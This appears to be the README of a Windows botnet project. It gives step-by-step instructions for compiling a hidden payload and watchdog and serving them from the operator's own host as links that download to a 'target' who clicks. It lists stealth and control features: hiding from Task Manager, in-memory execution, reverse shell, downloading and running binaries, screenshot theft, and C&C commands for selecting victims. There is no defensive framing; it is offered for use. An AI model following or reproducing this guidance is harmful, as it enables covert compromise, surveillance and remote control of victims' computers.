# Botnet

# Instructions:

1) Make sure all files are in the same folder.

2) create a folder called static, and in that folder create a folder called windows.

3) compile payload.py, and watchdog.py with "Nuitka" using the command " python -m nuitka --onefile --disable-console script.py"

4) place both compiled files in the Windows folder you created ealiar, these files will be automatically downloaded to your target when they click the link.

5) run server.py using " python server.py " or " python3 server.py " from the commandline.

6) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"

7) you should see requests comming in to your server...enjoy





# Watchdog:


+ Features:

+ Auto-start
+ Keeps payload alive.
+ Hide from Taskmanager.
+ Hide from startup.
+ Kill payload until Taskmanager is closed.
+ Run Payload in memory (no file touches disk).


# Payload:
+ Features:

+ Supports Multiple Commands
+ connects to reverse shell
+ downloads and runs binaries
+ Virtual-Machine Detection ( testing )
+ register to database



# C&C terminal:

/list = show registered users

/use = select a target

/create link = create a 1 time dynamic link to gather information ( incomplete ), link will stop working after it is clicked.

/help = show this.




# Server:

+ Features:

+ Checks if user is registered
+ Register users
+ Automatic download link's to binary files
+ downloads screenshots from payload
+ send mass command to all users
+ HTML GUI ( incomplete )



     

